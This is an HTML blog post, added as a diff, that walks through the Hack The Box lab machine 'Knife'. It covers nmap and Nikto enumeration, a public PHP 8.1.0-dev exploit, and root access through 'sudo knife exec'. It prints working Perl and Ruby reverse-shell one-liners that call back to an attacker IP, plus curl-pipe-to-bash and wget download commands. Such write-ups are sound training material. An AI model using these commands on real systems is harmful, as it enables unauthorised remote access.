@@ -1,0 +1,717 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Knife Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Knife Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-knife/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-13T23:14:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-knife/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">Alex Loney</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Knife Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-13T23:14:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="/blog/writeup/htb/htb-knife/" class="u-url" itemprop="url">HTB: Knife Writeup
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>I began the same as always, with an nmap scan</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Fri Jun 11 13:42:53 2021 as: nmap -sC -sV -oA nmap/knife 10.10.10.242</span>
+Nmap scan report <span class="k">for </span>10.10.10.242
+Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Jun 11 13:43:12 2021 -- 1 IP address (1 host up) scanned in 18.50 seconds</span>
+</code></pre></div></div>
+
+<p>Browsing to port <code class="language-plaintext highlighter-rouge">80</code>, there doesn’t appear to be much on it. Running Nikto to see if anything interesting pops up</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nikto <span class="nt">-host</span> http://10.10.10.242
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.10.10.242
++ Target Hostname:    10.10.10.242
++ Target Port:        80
++ Start Time:         2021-06-11 13:45:33 <span class="o">(</span>GMT-4<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ Retrieved x-powered-by header: PHP/8.1.0-dev
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
++ 7863 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 5 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2021-06-11 13:56:18 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span>645 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested
+</code></pre></div></div>
+
+<p>That’s something interesting, a dev version of PHP, doing a little google search reveals <a href="https://www.exploit-db.com/exploits/49933">exploit-db 49933</a>.</p>
+
+<p>Running it instantly gives a stateless interactive shell!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 49933.py
+Enter the full host url:
+http://10.10.10.242
+
+Interactive shell is opened on http://10.10.10.242 
+Can<span class="s1">'t acces tty; job crontol turned off.
+$ whoami
+james
+</span></code></pre></div></div>
+
+<p>Crafting a simple perl reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>rshell.pl
+perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.10.14.204";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+</code></pre></div></div>
+
+<p>And piping that through bash</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl 10.10.14.204/rshell.pl | bash
+</code></pre></div></div>
+
+<p>Success! We now have an ok interactive shell!</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>After a big of looking around, it turns out that we can execute the <code class="language-plaintext highlighter-rouge">knife</code> programs as root. Exploring the help, there’s a very interesting line</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>** EXEC COMMANDS **
+knife exec [SCRIPT] (options)
+</code></pre></div></div>
+
+<p>We can execute commands commands? Well that seems nice. After playing with this a bit, it turns out that it’s allows execution of Ruby scripts. So I crafted a little Ruby reverse shell as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>rshell.rb
+<span class="nb">exec</span><span class="o">(</span><span class="s2">"perl -e 'use Socket;</span><span class="nv">$i</span><span class="s2">=</span><span class="se">\"</span><span class="s2">10.10.14.204</span><span class="se">\"</span><span class="s2">;</span><span class="nv">$p</span><span class="s2">=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(</span><span class="se">\"</span><span class="s2">tcp</span><span class="se">\"</span><span class="s2">));if(connect(S,sockaddr_in(</span><span class="nv">$p</span><span class="s2">,inet_aton(</span><span class="nv">$i</span><span class="s2">)))){open(STDIN,</span><span class="se">\"</span><span class="s2">&gt;&amp;S</span><span class="se">\"</span><span class="s2">);open(STDOUT,</span><span class="se">\"</span><span class="s2">&gt;&amp;S</span><span class="se">\"</span><span class="s2">);open(STDERR,</span><span class="se">\"</span><span class="s2">&gt;&amp;S</span><span class="se">\"</span><span class="s2">);exec(</span><span class="se">\"</span><span class="s2">/bin/sh -i</span><span class="se">\"</span><span class="s2">);};'"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Copied it over to the server and executed it with the <code class="language-plaintext highlighter-rouge">knife</code> program</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget 10.10.14.204/rshell.rb
+<span class="nv">$ </span><span class="nb">sudo </span>knife <span class="nb">exec</span> /tmp/rshell.rb
+</code></pre></div></div>
+
+<p>And catching that reverse shell gives us root!!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item p-category" rel="tag">htb easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item p-category" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item p-category" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-06-13T23:14:00-07:00">June 13, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Knife+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-knife%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-knife%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-knife%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/writeup/htb/htb-tenet/" class="pagination--pager" title="HTB: Tenet Writeup
+">Previous</a>
+    
+    
+      <a href="/blog/writeup/htb/htb-dynstr/" class="pagination--pager" title="HTB: Dynstr Writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You May Also Enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-trick/" rel="permalink">HTB: Trick Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-dynstr/" rel="permalink">HTB: Dynstr Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-love/" rel="permalink">HTB: Love Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
